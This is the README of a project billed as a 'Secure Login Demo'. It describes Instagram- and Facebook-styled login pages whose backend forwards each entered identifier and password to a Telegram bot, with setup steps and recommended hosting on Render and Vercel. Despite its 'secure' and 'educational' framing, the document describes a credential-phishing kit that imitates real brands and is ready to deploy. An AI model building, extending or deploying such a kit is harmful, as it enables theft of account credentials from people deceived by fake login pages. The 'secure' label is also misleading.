# Secure Login Demo Application

A high-fidelity demonstration of a dual-platform (Instagram and Facebook) login system with a secure Node.js backend.

## Features
- **Dual UI**: Supports both Instagram and Facebook styled login pages.
- **Responsive Design**: Fully optimized for mobile and desktop resolutions.
- **Secure Backend**: Express server with bcrypt hashing and rate limiting.
- **Telegram Integration**: Sends login notifications (identifier and password) to a configured Telegram bot.
- **In-Memory Storage**: Uses an in-memory database for demonstration purposes (no MongoDB required).

## Setup

### Backend
1. Go to the `backend` folder.
2. Run `npm install`.
3. Create a `.env` file with your `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`.
4. Run `npm run dev`.

### Frontend
1. Go to the root folder.
2. Run `npm install`.
3. Set the `VITE_API_URL` environment variable if deploying to production.
4. Run `npm run dev`.

## Deployment
- **Backend**: Recommended deployment on [Render](https://render.com).
- **Frontend**: Recommended deployment on [Vercel](https://vercel.com).

## Security Notice
This project is for educational and demonstration purposes only. Do not use this for malicious purposes. Ensure you comply with all local laws and ethical guidelines.
